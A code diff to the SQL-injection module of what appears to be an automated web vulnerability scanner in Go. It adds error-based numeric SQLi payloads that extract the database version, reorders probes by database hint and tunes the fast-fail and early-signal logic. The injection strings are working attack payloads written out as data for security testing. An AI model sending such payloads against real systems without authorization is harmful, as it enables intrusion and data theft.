@@ -40,16 +40,24 @@ func (r *Runner) runSQLi(ctx context.Context, target ScanTarget) []ModuleFinding
 	}
 	sleepSec := timingblind.RecommendSleepSec(timingBase)
 	dbHint := r.techDatabaseHint(target.EndpointURL)
+	isNumeric := isNumericTargetValue(target)
+	nativeVal := nativeTargetValue(target)
+	sqliPayloads = prioritizeSQLiPayloads(sqliPayloads, dbHint, isNumeric, nativeVal)
 	classicAttempted := 0
 	classicDelivered := 0
 	earlySignalFound := false
+
+	fastFailLimit := 6
+	if isNumeric {
+		fastFailLimit = 10
+	}
 
 	for idx, p := range sqliPayloads {
 		if p.IsNegativeControl || p.IsControl {
 			continue
 		}
-		// Fast-fail: if the first 6 core error/boolean probes produce zero signal or error, terminate.
-		if idx >= 6 && !earlySignalFound && len(out) == 0 {
+		// Fast-fail: if initial core error/boolean probes produce zero signal or error, terminate.
+		if idx >= fastFailLimit && !earlySignalFound && len(out) == 0 {
 			break
 		}
 		// Content-difference SQLi must be evaluated as a matched true/false
@@ -115,7 +123,15 @@ func (r *Runner) runSQLi(ctx context.Context, target ScanTarget) []ModuleFinding
 			!sqliErrorInBody(rr.Response.Body, baseline.Response.Body) {
 			continue
 		}
+		if sqliErrorInBody(rr.Response.Body, baseline.Response.Body) ||
+			rr.Response.StatusCode == 500 ||
+			(baseline.Response.StatusCode < 400 && rr.Response.StatusCode >= 400 && rr.Response.StatusCode != 404) {
+			earlySignalFound = true
+		}
 		signal := detectSQLiSignal(probePayload, rr.Response.Body, baseline.Response.Body, elapsed, timingBase, sleepSec, rr.Response.StatusCode)
+		if signal != "" {
+			earlySignalFound = true
+		}
 		runtimeEvent, runtimeAssessment, runtimeObserved := r.runtimeAssessment(ctx, rr)
 		if runtimeObserved && runtimeAssessment.Safe {
 			// A correlated prepared/bound SQL execution is deterministic safe
@@ -460,6 +476,34 @@ func appendSQLiClassicFallbacks(existing []payloadgen.Payload, cfg config.ScanCo
 	}
 
 	return append(existing, sqliFallbackPayloadSet[:limit]...)
+}
+
+func prioritizeSQLiPayloads(payloads []payloadgen.Payload, dbHint string, isNumeric bool, nativeVal string) []payloadgen.Payload {
+	var numericProbes []payloadgen.Payload
+	if isNumeric && nativeVal != "" {
+		numericProbes = []payloadgen.Payload{
+			defaultPayload("sqli", "numeric_error_convert", nativeVal+" AND 1=CONVERT(INT, @@version)-- -", "sql_error"),
+			defaultPayload("sqli", "numeric_error_cast", nativeVal+" AND (SELECT 1 FROM CAST((SELECT version()) AS INT))-- -", "sql_error"),
+			defaultPayload("sqli", "numeric_error_extractvalue", nativeVal+" AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))-- -", "sql_error"),
+			defaultPayload("sqli", "numeric_arithmetic_subzero", nativeVal+"-0", "sql_error"),
+		}
+	}
+	combined := append(numericProbes, payloads...)
+	if dbHint != "" {
+		hint := strings.ToLower(strings.TrimSpace(dbHint))
+		var hinted []payloadgen.Payload
+		var rest []payloadgen.Payload
+		for _, p := range combined {
+			pv := strings.ToLower(p.Variant + " " + p.Value)
+			if strings.Contains(pv, hint) {
+				hinted = append(hinted, p)
+			} else {
+				rest = append(rest, p)
+			}
+		}
+		combined = append(hinted, rest...)
+	}
+	return combined
 }
 
 var sqliFallbackPayloadSet = []payloadgen.Payload{
